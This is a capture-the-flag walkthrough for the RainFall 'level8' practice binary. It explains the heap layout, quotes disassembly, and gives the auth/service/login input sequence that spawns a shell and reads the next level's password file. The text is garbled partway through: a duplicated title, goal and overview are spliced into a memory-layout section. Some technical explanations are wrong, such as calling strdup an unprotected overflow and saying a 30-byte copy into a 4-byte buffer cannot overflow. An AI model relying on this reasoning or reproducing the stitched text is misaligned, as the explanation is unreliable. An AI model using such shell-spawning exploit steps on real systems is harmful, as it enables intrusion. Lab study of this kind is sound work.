# Level8 Walkthrough 

## 🎯 Goal
Exploit a heap overflow vulnerability in `level8` to gain a shell and read the password for `level9`.

---

## 🔍 Binary Overview

From the disassembly:

- `auth` command:
  ```asm
  0x080485e4 <+128>:  malloc(4)
  0x080485fa <+150>:  *(auth) = 0
  0x08048625 <+193>:  cmp $0x1e, ...  jne skip_strcpy
  0x0804863d <+217>:  strcpy(auth, payload)
  ```
  - Allocates **4 bytes** on the heap.
  - Stores the pointer at `0x8049aac`.
  - Copies payload **only if <= 30 bytes** (bounds checked).
  
- `service` command:
  ```asm
  0x080486ab <+327>:  strdup(payload)
  0x080486b0 <+332>:  service pointer stored at 0x8049ab0
  ```
  - Allocates memory with `strdup` (length = string + 1 for null terminator).  
  - Stores pointer at `0x8049ab0`.  

- `login` command:
  ```asm
  0x080486e2 <+382>:  if (auth && *((int *)(auth + 32)))
  0x080486ee <+394>:      system("/bin/sh")
  ```
  - Checks **32 bytes past auth pointer**.  
  - If non-zero → triggers shell.

---

## 🧱 Heap Layout & Vulnerability

### Heap after `auth AAAA`:

```
Address      | Data
-------------------------
0x804a008    | Auth user: AAAA
0x804a00c    | malloc metadata (prev_size + size)
```

### Heap after `service BBBB` with `strdup`:

```
0x804a018    | Service data: BBBB...
0x804a01C    | null terminator added by strdup
```

**Memory relationship:**

```
auth chunk: 4 bytes user data + 8 bytes malloc header
service chunk: strlen(payload)+1 bytes + 8 bytes malloc header
```

**Check `auth + 32`:**

- `auth` user data: 4 bytes  
- Auth header: 8 bytes  
- Service header: 8 bytes  
- First 12–16 bytes of service payload reach `auth + 32`  

💡 That’s why **16 bytes of service payload** is enough to satisfy the `login` check.  

---

## 🚀 Exploit Strategy

### Step 1: Create Auth Structure

```
> auth AAAA
```

- Allocates **4-byte chunk** on the heap.  
- Pointer saved in `0x8049aac`.  
- Memory layout:

```
0x804a008: AAAA
0x804a00c: malloc header
```

### Step 2: Overflow Service Chunk

```
> service AAAAAAAAAAAAAAAA
```

- `strdup` allocates **length = 16+1 bytes**.  
- Writes payload into heap.  
- Because of heap adjacency, **first 16 bytes of service payload reach `auth + 32`**.  

Memory layout:Level8 Walkthrough – Heap Overflow Exploit
🎯 Goal

Exploit a heap overflow vulnerability in level8 to gain a shell and read the password for level9.

🔍 Binary Overview

From the disassembly:

auth command:

```
0x804a008: AAAA           <- auth user
0x804a00c: header         <- auth metadata
0x804a018: AAAAAAAAAAAAAAAA <- service payload (overflows into auth + 32)
0x804a01c: 00             <- strdup null terminator
```

- Now `*((int *)(auth + 32)) != 0` → triggers shell in `login`.

### Step 3: Trigger Shell

```
> login
```

- Checks `if (auth && *((int *)(auth + 32)))`.  
- Condition true due to service overflow.  
- Executes `system("/bin/sh")`.  

---

## ✅ Key Technical Details

1. **Auth vs Service allocation:**
   - `auth` uses `malloc(4)` → small, fixed size.  
   - `service` uses `strdup()` → allocates exact string length + 1.  

2. **Heap adjacency** is crucial:
   - Small `auth` chunk placed before service chunk.  
   - Overflow from service payload reaches `auth + 32`.  

3. **Overflow length:**
   - Minimum ~16 characters for service payload needed.  
   - Anything shorter → does **not** set the memory at `auth + 32`.  
   - Anything longer → safely triggers shell.

4. **Bounds checking:**
   - `auth` uses `strcpy` with `<=30` check → cannot overflow `auth`.  
   - `service` uses `strdup` → **no overflow protection**.  

5. **Memory Corruption:**
   - Only the **value at auth + 32** is relevant.  
   - Other bytes of `auth` or `service` do not need to be corrupted.  

---

## 💡 Exploit Example

```text
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service AAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
<password>
```

- 16 `A`s in service → enough to hit `auth + 32`.  
- Pointer arithmetic + heap layout makes it predictable.  

---

